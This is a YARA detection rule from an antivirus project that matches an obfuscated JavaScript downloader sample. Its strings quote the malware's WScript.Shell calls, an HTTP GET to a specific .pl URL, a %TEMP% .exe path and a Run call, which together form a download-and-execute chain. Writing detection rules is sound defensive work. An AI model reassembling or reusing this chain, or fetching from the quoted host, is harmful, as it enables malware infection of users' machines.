rule sig_20160401_36a9a35827bec837d8e4a4cf34b8c009 {
  meta:
    description = "datamaliciousorder - file 20160401_36a9a35827bec837d8e4a4cf34b8c009.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "ff5d740c384757ec455cbcf9e42d13e393239026d1795fe3a1f2869b073b20d4"

  strings:
    $s1  = "var SyNwk = function VoBg() {return WScript[PlIt](\"WScript\"+\".Shell\");}(), FjsMwi = 11;" fullword ascii
    $s2  = "function OsXsc(IjuKsv, IwmHr){TrBsz = TrBsz * 1; return IjuKsv - IwmHr;};" fullword ascii
    $s3  = "FxIvi[NtNnp](\"G\" + \"ET\", \"http://garmulewicz.pl/v4yhsa\", false);" fullword ascii
    $s4  = "if (FxIvi[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function CziCh(){return BfwCs + \"\";};" fullword ascii
    $s6  = "function MhwTuj() {return SyNwk[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"NyzFXbfafL9J.ex\" + \"e\";};" fullword ascii
    $s7  = "function PdYh() {return ((AuaWyt == true) && (AuaWyt == AsGs)) ? 1 : TrBsz;};" fullword ascii
    $s8  = "function UbpLv(JxbZrk){SyNwk[\"R\"+\"un\"](JxbZrk, TrBsz, TrBsz);};" fullword ascii
    $s9  = "function DoIuu(VaJu) {var WfFwp = (1, 2, 3, 4, 5, VaJu); return WfFwp;};" fullword ascii
    $s10 = "function GtmDf()" fullword ascii
    $s11 = "function AimJc(){return PlIt;};" fullword ascii
    $s12 = "AuaWyt = true; " fullword ascii
    $s13 = "AsGs = true; " fullword ascii
    $s14 = "var AsGs = false;" fullword ascii
    $s15 = "var AuaWyt = false;" fullword ascii
    $s16 = "var NrmLns = false;" fullword ascii
    $s17 = "function TjqXky(){return 23;};" fullword ascii
    $s18 = "}while (NphKsb);" fullword ascii
    $s19 = "var TxSlo = new this[\"Date\"]();" fullword ascii
    $s20 = "return OsXsc(UioGi, IwbXdq);" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}